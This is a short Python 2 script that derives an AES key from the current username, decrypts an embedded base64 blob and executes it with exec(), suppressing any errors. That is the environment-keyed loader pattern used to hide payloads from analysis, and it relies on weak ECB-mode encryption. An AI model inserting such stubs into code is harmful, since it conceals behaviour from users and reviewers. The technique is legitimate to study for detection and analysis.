#!/usr/bin/env python

from Crypto.Cipher import AES
import base64
import getpass
import os

# set some aes properties
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# calculated the needed filling
offset = 32 - len(getpass.getuser())

secret = ""

# fill string with zeros
for i in range(0,offset):
	secret += "0"

# append username to secret
secret += getpass.getuser()

# create cipher
cipher = AES.new(secret)

# decode source code
decoded = DecodeAES(cipher, "Tt7Q+ZgHaalQgecuVyT4moygbJulIrZx6VghjRfN+ms=")

# try to execute the code
try:
	exec(decoded)
except Exception, e:
	pass